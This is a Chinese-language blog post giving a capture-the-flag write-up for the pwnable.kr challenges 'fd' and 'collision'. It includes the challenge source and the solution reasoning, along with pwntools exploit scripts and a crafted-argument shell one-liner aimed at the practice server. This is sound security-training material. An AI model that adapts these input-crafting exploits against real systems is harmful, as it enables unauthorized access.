<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>pwnable.kr(1-2) | </title>

  
  <meta name="author" content="damn1t">
  

  
  <meta name="description" content="pwnable.kr(1-2)fd第一题ssh连接之后给出如下代码：
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
char buf[32];
int main(int argc, char*">
  

  
  
  <meta name="keywords" content="pwn">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="pwnable.kr(1-2)"/>

  <meta property="og:site_name" content=""/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/"></a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/tags">Tags</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>pwnable.kr(1-2)</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2018/09/08/pwn/pwnable1/" rel="bookmark">
        <time class="entry-date published" datetime="2018-09-08T08:43:57.645Z">
          2018-09-08
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h1 id="pwnable-kr-1-2"><a href="#pwnable-kr-1-2" class="headerlink" title="pwnable.kr(1-2)"></a>pwnable.kr(1-2)</h1><h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><p>第一题ssh连接之后给出如下代码：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
char buf[32];
int main(int argc, char* argv[], char* envp[]){
//argc是命令行参数个数(必为int类型)，char*argv[]是指所有命令行参数，char *envp[]是环境变量
//argv参数是字符串指针数组，其各元素值为命令行中各字符串的首地址，指针数组的长度即为参数个数

    if(argc&lt;2){
        printf(&quot;pass argv[1] a number\n&quot;);
        return 0;
    }
    int fd = atoi( argv[1] ) - 0x1234;
    //atoi函数将字符串转化成整形
    //fd文件描述符，只是一个整数
    int len = 0;
    len = read(fd, buf, 32);
    /*read()会把参数fd所指的文件传送count个字节到buf指针所指的内存中。若参数count为0，则read()不会有作用并返回0。
    返回值为实际读取到的字节数，如果返回0，表示已到达文件尾或是无可读取的数据，此外文件读写位置会随读取到的字节移动*/
    if(!strcmp(&quot;LETMEWIN\n&quot;, buf)){
        printf(&quot;good job :)\n&quot;);
        system(&quot;/bin/cat flag&quot;);
        exit(0);
    }
    printf(&quot;learn about Linux file IO\n&quot;);
    return 0;

}
</code></pre><p>这题的重点在题目中也提示了-&gt;<strong>fd</strong><br>通过查阅资料了解到fd就是File descripter也就是文件描述符，维基上有如下解释：In Unix and related computer operating systems, a file descriptor (FD, less frequently fildes) is an abstract indicator (handle) used to access a file or other input/output resource, such as a pipe or network socket.<br>所以<strong>fd</strong>是在UNIX及其相关联系统上才有的，<strong>fd</strong>为一个非负整数，他的0，1，2代表了不同的含义<br><img src="https://i.imgur.com/dnzdPFz.png" alt=""></p>
<p>回到原题，关键要满足：<code>buf=LETMEWIN</code>，所以要输入<strong>LETMEWIN</strong>就要使<code>int fd = atoi( argv[1] ) - 0x1234;</code>中的fd为0，因为0x1234=4660(int)，因此在终端输入<strong>./fd 4660</strong>然后再写入<strong>LETMEWIN</strong>即可<br>再给出一个exp：</p>
<pre><code>from pwn import *
pwn_ssh=ssh(host=&apos;pwnable.kr&apos;,user=&apos;fd&apos;,password=&apos;guest&apos;,port=2222)
print (pwn_ssh.connected())
sh=pwn_ssh.process(argv=[&apos;fd&apos;,&apos;4660&apos;],executable=&apos;./fd&apos;)
sh.sendline(&quot;LETMEWIN&quot;)
print (sh.recvall())
</code></pre><h2 id="collision"><a href="#collision" class="headerlink" title="collision"></a>collision</h2><p>老规矩查看代码：</p>
<pre><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
    int* ip = (int*)p;
    int i;
    int res=0;
    for(i=0; i&lt;5; i++){
        res += ip[i];
    }
    return res;
}

int main(int argc, char* argv[]){
/*前者可接受 命令行参数，argc表示参数个数， argv[]是参数数组,其中第0个参数是程序本身的名称（包含路径）。
argv[]是一个字符数组.
argv[0]:指向程序的全路径名
argv[1]:指向在DOS命令行中执行程序名后的第一个字符串。
argv[2]:指向第二个字符串。
*/

    if(argc&lt;2){
        printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);
        return 0;
    }
    if(strlen(argv[1]) != 20){
        printf(&quot;passcode length should be 20 bytes\n&quot;);
        return 0;
    }

//
//参数至少两个，hashcode=input
    if(hashcode == check_password( argv[1] )){
        system(&quot;/bin/cat flag&quot;);
        return 0;
    }
    else
        printf(&quot;wrong passcode.\n&quot;);
    return 0;
}
</code></pre><p>思路很明显：输入参数20个字节，最后res的值在5次循环相加之后要满足等于0x21DD09EC，还要说明的一点是int占4个字节，char占1个字节，因此<code>int* ip = (int*)p;</code>这里就将passcode分成了有5个参数的数组，所以随便输入一个<code>hex(0x21DD09EC-0x01020304*4)</code>得到0x1dd4fddc，于是在终端输入<br> <code>./col $(python -c &#39;print &quot;\xdc\xfd\xd4\x1d&quot;+4*&quot;\x04\x03\x02\x01&quot;&#39;)</code><br>最终得到答案<br>有一点要说的是<strong>python -c</strong>，python给出的解释是：</p>
<blockquote>
<p>-c cmd : program passed in as string (terminates option list)</p>
</blockquote>
<p>给出exp：</p>
<pre><code>from pwn import *
import os

pwn_ssh=ssh(host=&apos;pwnable.kr&apos;,user=&apos;col&apos;,password=&apos;guest&apos;,port=2222)
print (pwn_ssh.connected())

sh=pwn_ssh.process(argv=[&apos;collision&apos;,&apos;\xfc\x01\xf9\x39&apos; * 5],executable=&apos;./col&apos;)
print (sh.recvall())
</code></pre>
      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    
    

    <span class="post-tags">
      <i class="icon-tags"></i>
        <a href="/tags/pwn/">pwn</a>
    </span>
    

    </div>

    
  </div>
</article>


    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2019 damn1t
    
  </p>
</footer>
    
  </div>
</div>
</body>
</html>